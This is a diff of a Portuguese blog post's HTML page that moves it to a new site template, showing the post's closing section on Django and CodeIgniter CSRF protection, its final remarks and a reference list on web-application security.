class=Article-tagLink>csrf</a> <a href=https://klauslaube.com.br/tag/sql-injection.html title="Leia mais sobre" class=Article-tagLink>sql-injection</a> <a href=https://klauslaube.com.br/tag/php-injection.html title="Leia mais sobre" class=Article-tagLink>php-injection</a> <a href=https://klauslaube.com.br/tag/django.html title="Leia mais sobre" class=Article-tagLink>django</a> <a href=https://klauslaube.com.br/tag/php.html title="Leia mais sobre" class=Article-tagLink>php</a> <a href=https://klauslaube.com.br/tag/codeigniter.html title="Leia mais sobre" class=Article-tagLink>codeigniter</a> </span> </div> <div class=Article-comments> <div id=disqus_thread></div> <script type=text/javascript>
-        var disqus_shortname = "klauslaube";
-        var disqus_identifier = "2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html";
-
-        (function() {
-        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        })();
-    </script> <noscript>Please enable JavaScript to view the <a href=http://disqus.com/?ref_noscript rel=nofollow>comments powered by Disqus.</a></noscript> </div> </article> </div> <footer class="PageFooter pure-u-1"> <div class=u-box> <p>O conteúdo deste blog está sob a licença <a class=PageFooter-link href=http://creativecommons.org/licenses/by/3.0/deed.pt_BR title="Distribua, adapte, use. Mas mencione o autor." rel=nofollow>Creative Commons Attribution 3.0</a>.</p> <p>O código está disponível em <a class=PageFooter-link href=https://github.com/kplaube/blog/ title=Contribute! rel=nofollow>GitHub</a>.</p> </div> </footer> </div> <script>
-        (function(b,o,i,l,e,r){b.GoogleAnalyticsObject=l;b[l]||(b[l]=
-        function(){(b[l].q=b[l].q||[]).push(arguments)});b[l].l=+new Date;
-        e=o.createElement(i);r=o.getElementsByTagName(i)[0];
-        e.src='//www.google-analytics.com/analytics.js';
-        r.parentNode.insertBefore(e,r)}(window,document,'script','ga'));
-        ga('create','UA-19657400-1');ga('send','pageview');
-    </script> </body> </html>
+&lt;/form&gt;</code></pre></div>
+<p>A <em>templatetag</em> acima criará um campo oculto no formulário chamado
+<code class="language-text">csrfmiddlewaretoken</code>. Quando um <em>POST</em> for realizado para a <em>view</em> em
+questão, caso o conteúdo de <code class="language-text">csrfmiddlewaretoken</code> vindo do formulário
+não “bata” com o conteúdo armazenado em sessão, o <em>Django</em> entende que
+aquela requisição não foi feita de maneira “natural” (ou seja, acessando
+o formulário e submetendo-o). Logo, fica subentendido que aquela
+requisição veio de outra origem, e o <em>framework</em> não executa as
+instruções da <em>view</em> (retornando um código 403).</p>
+<p>No <em>Codeigniter</em>, com a opção <code class="language-text">$config[&#39;csrf_protection’]</code> como
+<code class="language-text">TRUE</code> no arquivo <code class="language-text">application/config/config.php</code>, o <em>framework</em>
+adicionará automaticamente o campo de proteção <em>CSRF</em> na abertura do
+formulário:</p>
+<div class="gatsby-highlight" data-language="php"><pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">form_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre></div>
+<h2>Considerações finais</h2>
+<p>Ficou um <em>post</em> grande, mas acredito que consegui cobrir os problemas de
+segurança mais conhecidos em aplicações <em>Web</em>. Como é possível notar,
+são vulnerabilidades que são facilmente contornáveis, mas que podem
+trazer sérios problemas para você e seus usuários caso a sua aplicação
+não esteja segura o bastante.</p>
+<p>Reforço: Se você tiver a oportunidade de utilizar um <em>framework</em>,
+utilize! Eles possuem soluções prontas e bem testadas para prevenir os
+problemas citados acima, e outros tantos que surgem a cada dia na
+<em>internet</em>.</p>
+<h2>Referências</h2>
+<ul>
+<li><a href="http://www.dinke.net/blog/en/2011/10/20/validating-an-integer-with-php/" title="As diferentes formas de validarmos um valor inteiro em PHP"><em>Caugh in a Web: Validating an integer in PHP</em></a></li>
+<li><a href="http://codeigniter.com/user_guide/database/active_record.html" title="Saiba como fazer consultas eficientes ao banco de dados com o Codeigniter"><em>Codeigniter User Guide: Active Record Class</em></a></li>
+<li><a href="http://codeigniter.com/user_guide/general/security.html" title="Veja as dicas de segurança dadas pelo time do Codeigniter"><em>Codeigniter User Guide: Security</em></a></li>
+<li><a href="https://docs.djangoproject.com/en/1.4/topics/db/queries/" title="Saiba como construir modelos e como consultá-los através do ORM do Django"><em>Django Documentation: Making queries</em></a></li>
+<li><a href="https://docs.djangoproject.com/en/dev/topics/security/" title="Veja dicas preciosas de segurança utilizando o Django"><em>Django Documentation: Security in Django</em></a></li>
+<li><a href="http://www.invasao.com.br/2008/03/18/php-injection-o-fim-das-duvidas/" title="Entenda como funciona um ataque via PHP Injection">Invasão.com.br: <em>PHP Injection</em> – O fim das dúvidas</a></li>
+<li><a href="http://www.php.net/manual/pt_BR/book.mysqli.php" title="Conheça a mysqli direto da documentação do PHP"><em>PHP Documentation: MySQL Melhorada</em></a></li>
+<li><a href="http://php.net/pdo" title="Conheça uma das formas mais eficientes de fazer consultas a bancos de dados no PHP"><em>PHP Documentation: PDO – PHP Data Objects</em></a></li>
+<li><a href="http://phpsp.org.br/2011/07/protegendo-seu-sistema-contra-ataques-csrf/" title="Aprenda como utilizar tolkens para prevenir ataques CSRF"><em>PHP SP</em>: Protegendo o seu sistema contra ataques <em>CSRF</em></a></li>
+<li><a href="http://www.sitepoint.com/php-security-blunders/" title="Excelentes dicas de segurança para quem programa em PHP"><em>Site Point: Top 7 PHP Security Blunders Article</em></a></li>
+<li><a href="http://stackoverflow.com/questions/60174/best-way-to-stop-sql-injection-in-php" title="Excelente thread no Stack Overflow, sobre SQL injection"><em>Stack Overflow: Best way to stop SQL injection in PHP</em></a></li>
+<li><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" title="Um bom artigo sobre o conceito do CSRF"><em>The Open Web Application Security Project: Cross-Site Request Forgery</em></a></li>
+<li><a href="http://en.wikipedia.org/wiki/Code_injection" title="Leia mais sobre as formas de injeção de código no Wikipedia"><em>Wikipedia: Code Injection</em></a></li>
+<li><a href="http://pt.wikipedia.org/wiki/Inje%C3%A7%C3%A3o_de_SQL" title="Leia mais sobre SQL Injection no Wikipedia"><em>Wikipedia</em>: Injeção de <em>SQL</em></a></li>
+</ul></div><div class="article-tags__Tags-lfitfk-0 gKRNvs"><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/desenvolvimento-web.html">desenvolvimento-web</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/segurança.html">segurança</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/xss.html">xss</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/csrf.html">csrf</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/sql-injection.html">sql-injection</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/php-injection.html">php-injection</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/django.html">django</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/php.html">php</a><a class="article-tags__Tag-lfitfk-1 kdcwKK" href="/tag/codeigniter.html">codeigniter</a></div><div class="article__DiscussionWrapper-sc-1bof3w4-2 lhlkLZ"><div shortname="klauslaube" config="[object Object]" id="disqus_thread"></div></div></div></div><footer class="page-footer__Footer-sc-1jesc4c-0 eZHcyp"><div class="container-sc-1o2is99-0 bfwjqj"><p>O conteúdo desse blog está sob a licença<!-- --> <a href="http://creativecommons.org/licenses/by/3.0/deed.pt_BR" class="page-footer__Link-sc-1jesc4c-1 hCZhVV">Creative Commons Attribution</a>.</p><p><a href="https://github.com/kplaube/blog" class="page-footer__Link-sc-1jesc4c-1 hCZhVV">Fork me on Github</a>.</p></div></footer></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/2012/04/15/problemas-de-seguranca-em-aplicacoes-web.html";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"app":["/app-e7e259d06d29a943bae9.js"],"component---src-templates-blog-post-js":["/component---src-templates-blog-post-js-7be79c03a887a02ef403.js"],"component---src-templates-blog-list-js":["/component---src-templates-blog-list-js-0712dae6686d19cfe871.js"],"component---src-templates-tag-js":["/component---src-templates-tag-js-37944ec4ec91a7d47898.js"],"component---src-pages-404-js":["/component---src-pages-404-js-bf5e10cca5c03eb48f60.js"]};/*]]>*/</script><script src="/component---src-templates-blog-post-js-7be79c03a887a02ef403.js" async=""></script><script src="/commons-d19a5247b9c341fd9cf4.js" async=""></script><script src="/app-e7e259d06d29a943bae9.js" async=""></script><script src="/styles-72b9aca6a03bf971c27e.js" async=""></script><script src="/framework-15c64f04ece7e16d9319.js" async=""></script><script src="/webpack-runtime-74a6d0a7c3b7aca6f059.js" async=""></script></body></html>
